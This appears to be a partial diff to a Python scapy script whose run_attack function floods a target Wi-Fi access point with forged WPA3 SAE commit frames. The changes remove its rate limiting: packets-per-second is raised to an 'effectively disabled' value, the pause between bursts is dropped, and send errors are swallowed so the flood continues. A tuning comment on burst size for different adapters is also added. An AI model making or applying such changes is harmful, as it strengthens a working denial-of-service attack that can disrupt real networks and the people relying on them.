@@ -12,8 +12,8 @@ import random
 from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC, sendp
 
 GROUP_ID_BYTES = b"\x13\x00"
-BURST_SIZE = 128
-PACKETS_PER_SEC = 1000
+BURST_SIZE = 128          # Reduce to 64 for unstable/cheap Wi-Fi adapters, or increase to 256 for high-end hardware.
+PACKETS_PER_SEC = 1000000 # Effectively disabled for maximum throughput
 
 ARR = {}
 
@@ -164,7 +164,7 @@ def run_attack(bssid, channel, interface, language, pairs, band=""):
             for _ in range(BURST_SIZE // 2):
                 pkts.append(make_sae_commit(static_mac, bssid, scalar, finite))
 
-            sendp(pkts, iface=interface, verbose=False)
+            sendp(pkts, iface=interface, verbose=False, inter=0.0001) 
             counter += BURST_SIZE
 
             if counter >= next_log:
@@ -179,9 +179,9 @@ def run_attack(bssid, channel, interface, language, pairs, band=""):
                     sys.stdout.flush()
                     progress_printed = True
                 next_log += 2000
-
-            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SEC / BURST_SIZE)))
-
+        except OSError as e:
+            time.sleep(0.001)
+            continue
         except KeyboardInterrupt:
             break
         except Exception:
